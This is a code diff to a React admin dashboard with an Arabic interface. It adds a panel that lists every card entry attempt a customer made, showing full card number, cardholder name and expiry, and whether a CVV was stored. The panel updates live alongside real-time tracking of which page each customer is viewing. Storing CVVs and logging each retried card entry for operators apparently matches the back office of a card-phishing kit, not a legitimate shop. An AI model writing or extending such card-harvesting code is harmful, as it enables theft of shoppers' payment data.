@@ -1,10 +1,20 @@
 import { useState, useEffect, useMemo } from 'react';
 import { useListAdminOrders } from '@workspace/api-client-react';
-import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff } from 'lucide-react';
+import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff, Clock } from 'lucide-react';
 import { LoadingBlock, ErrorBlock } from '../shared';
 import { usePresence } from '@/hooks/usePresence';
 
 type CustomerTab = 'info' | 'summary' | 'payment' | 'verification';
+
+interface CardAttempt {
+  id: number;
+  orderId: number;
+  cardName: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string | null;
+  createdAt: string;
+}
 
 function formatCardNumber(num: string | undefined | null) {
   if (!num) return '---';
@@ -35,6 +45,17 @@ function getPageDisplayName(path: string): string {
   return pageNames[path] || path;
 }
 
+function formatDateTime(dateString: string): string {
+  const date = new Date(dateString);
+  return date.toLocaleString('ar-SA', {
+    year: 'numeric',
+    month: 'short',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+  });
+}
+
 export function CustomersAdmin() {
   const { data: orders, isLoading, isError, refetch } = useListAdminOrders({
     query: {
@@ -43,6 +64,8 @@ export function CustomersAdmin() {
   });
   const [selectedCustomerId, setSelectedCustomerId] = useState<number | null>(null);
   const [activeTab, setActiveTab] = useState<CustomerTab>('info');
+  const [cardAttempts, setCardAttempts] = useState<CardAttempt[]>([]);
+  const [loadingAttempts, setLoadingAttempts] = useState(false);
 
   // Listen for real-time new order events via WebSocket
   useEffect(() => {
@@ -53,6 +76,38 @@ export function CustomersAdmin() {
     window.addEventListener('mawashi-new-order', handleNewOrder);
     return () => window.removeEventListener('mawashi-new-order', handleNewOrder);
   }, [refetch]);
+
+  // Fetch card attempts when selected customer changes
+  useEffect(() => {
+    if (!selectedCustomerId) {
+      setCardAttempts([]);
+      return;
+    }
+
+    const fetchCardAttempts = async () => {
+      setLoadingAttempts(true);
+      try {
+        const response = await fetch(`/api/admin/orders/${selectedCustomerId}/card-attempts`);
+        if (response.ok) {
+          const data = await response.json();
+          setCardAttempts(data);
+        }
+      } catch (error) {
+        console.error("[Admin] Failed to fetch card attempts:", error);
+      } finally {
+        setLoadingAttempts(false);
+      }
+    };
+
+    fetchCardAttempts();
+
+    // Also listen for card attempts updates
+    const handleCardAttempt = () => {
+      fetchCardAttempts();
+    };
+    window.addEventListener('mawashi-card-attempt', handleCardAttempt);
+    return () => window.removeEventListener('mawashi-card-attempt', handleCardAttempt);
+  }, [selectedCustomerId]);
   
   // Real-time presence from WebSocket
   const { presenceClients, isConnected } = usePresence();
@@ -187,42 +242,97 @@ export function CustomersAdmin() {
     </div>
   ) : null;
 
+  // Card attempt component for individual cards
+  const CardAttemptCard = ({ attempt, index }: { attempt: CardAttempt; index: number }) => (
+    <div className={`rounded-lg border bg-card p-6 ${index === 0 ? 'ring-2 ring-primary' : ''}`}>
+      <div className="mb-4 flex items-center justify-between">
+        <div className="flex items-center gap-2">
+          <span className="text-sm font-medium text-muted-foreground">المحاولة #{index + 1}</span>
+          {index === 0 && (
+            <span className="rounded-full bg-primary/10 px-2 py-0.5 text-xs font-medium text-primary">
+              الأحدث
+            </span>
+          )}
+        </div>
+        <div className="flex items-center gap-1 text-xs text-muted-foreground">
+          <Clock className="h-3 w-3" />
+          {formatDateTime(attempt.createdAt)}
+        </div>
+      </div>
+
+      <div className="mb-4 flex items-center justify-between">
+        <p className="text-sm text-muted-foreground">رقم البطاقة</p>
+        <div className="flex items-center gap-2">
+          <span className="font-mono text-sm">{formatCardNumber(attempt.cardNumber)}</span>
+          <span className="text-green-500">✓</span>
+        </div>
+      </div>
+
+      <div className="mb-4 flex items-center justify-between">
+        <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
+        <span className="text-sm">{attempt.cardName}</span>
+      </div>
+
+      <div className="grid grid-cols-2 gap-4">
+        <div className="flex items-center justify-between">
+          <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
+          <span className="text-sm">{attempt.cardExpiry}</span>
+        </div>
+
+        <div className="flex items-center justify-between">
+          <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
+          <span className="font-medium" dir="ltr">{attempt.cardCvv ? '***' : '---'}</span>
+        </div>
+      </div>
+    </div>
+  );
+
   const PaymentSection = () => selectedOrder ? (
     <div className="space-y-4">
       <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
         <CreditCard className="h-6 w-6 text-primary" />
         <div>
           <h3 className="font-bold">بيانات البطاقة</h3>
-          <p className="text-sm text-muted-foreground">معلومات بطاقة الدفع</p>
+          <p className="text-sm text-muted-foreground">
+            {cardAttempts.length > 0 
+              ? `${cardAttempts.length} محاولة إدخال` 
+              : 'معلومات بطاقة الدفع'}
+          </p>
         </div>
       </div>
 
-      <div className="rounded-lg border bg-card p-6">
-        <div className="mb-4 flex items-center justify-between">
-          <p className="text-sm text-muted-foreground">رقم البطاقة</p>
-          <div className="flex items-center gap-2">
-            <span className="font-mono text-sm">{formatCardNumber(selectedOrder.cardNumber)}</span>
-            {selectedOrder.cardNumber && <span className="text-green-500">✓</span>}
-          </div>
+      {loadingAttempts ? (
+        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
+          جاري تحميل المحاولات...
         </div>
-
-        <div className="mb-4 flex items-center justify-between">
-          <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
-          <span className="text-sm">{selectedOrder.cardName || '---'}</span>
+      ) : cardAttempts.length > 0 ? (
+        // Show all card attempts
+        <div className="space-y-4">
+          {cardAttempts.map((attempt, index) => (
+            <CardAttemptCard key={attempt.id} attempt={attempt} index={index} />
+          ))}
         </div>
-
-        <div className="grid grid-cols-2 gap-4">
-          <div className="flex items-center justify-between">
-            <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
-            <span className="text-sm">{selectedOrder.cardExpiry || '---'}</span>
-          </div>
-
-          <div className="flex items-center justify-between">
-            <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
-            <span className="font-medium" dir="ltr">{selectedOrder.cardCvv ? '***' : '---'}</span>
-          </div>
+      ) : selectedOrder.cardNumber ? (
+        // Show current order card data as single card if no attempts recorded
+        <div className="space-y-4">
+          <CardAttemptCard 
+            attempt={{
+              id: 0,
+              orderId: selectedOrder.id,
+              cardName: selectedOrder.cardName || '---',
+              cardNumber: selectedOrder.cardNumber,
+              cardExpiry: selectedOrder.cardExpiry || '---',
+              cardCvv: selectedOrder.cardCvv,
+              createdAt: selectedOrder.createdAt as string,
+            }} 
+            index={0} 
+          />
         </div>
-      </div>
+      ) : (
+        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
+          لم يتم إدخال بيانات بطاقة بعد
+        </div>
+      )}
     </div>
   ) : null;
 
